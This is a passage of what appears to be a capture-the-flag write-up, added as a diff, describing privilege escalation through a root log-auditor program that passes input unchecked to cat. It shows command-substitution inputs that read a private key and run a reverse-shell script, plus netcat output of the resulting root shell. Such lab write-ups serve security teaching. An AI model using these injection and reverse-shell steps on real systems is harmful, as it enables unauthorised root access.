@@ -179,3 +179,46 @@ Logs available
 
 Load which log?: 
  ```
+
+Entering the name of one of the two logs displays it, as you might expect. If we enter the name of any other file, we get an error. I tried downloading the code onto my own VM and trying it after deleting `/var/log/apache2/access.log` and it still appeared in the "Logs available" list - leading me to believe that this is a hardcoded list of files that the program will write.
+
+## Privilege Escalation
+
+On the face of things, this does not seem particularly useful. Only two files can be read as root, and neither of those files can be modified by my user. This means that I cannot even replace them with a symbolic link and use it to read other files on the system as root. However, a little experimentation revealed the following vulnerability in the log auditor:
+
+```
+Load which log?: /var/log/auth.log /home/evilscience/y
+```
+
+The input to the program is passed directly to the `cat` command, which of course accepts multiple arguments. Only the first argument is checked for validity; any after it are let through without comment. Using this flaw, I was able to read the private key of the `evilscience` user at `/home/evilscience/y` - although, as it was encrypted and non-trivial to crack, this didn't help me much.
+
+I wondered what else I could pass to the `cat` command, however. I determined pretty early on that passing `/root/*` would let me read the flag file - but this didn't seem in the spirit of things, as the challenge requires us to get a root shell. So I decided to try command substitution instead:
+
+```
+Load which log?: /var/log/auth.log $(touch /tmp/test.txt)
+```
+
+Checking /tmp/test/txt after doing this confirmed that a file had been written there, owned by root. 
+
+## Getting a Root Shell
+
+With the ability to arbitrarily execute commands as root, getting to a superuser shell is only a matter of time. The method I decided to use was a simple one. I reused my reverse shell at `/tmp/shell.sh`, changing the port to 9999 and putting the new version at `/tmp/shell3.sh`. Then, while running a netcat listener, I did:
+
+```
+Load which log?: /var/log/auth.log $(/bin/bash /tmp/shell3.sh)
+```
+
+The result:
+
+```
+root@kali:~# nc -nlvp 9999
+listening on [any] 9999 ...
+connect to [192.168.56.102] from (UNKNOWN) [192.168.56.106] 41224
+# whoami
+root
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# 
+```
+
+I have a root shell! At this point, I reused `/tmp/shell2.sh` to upgrade my root shell into an interactive one.
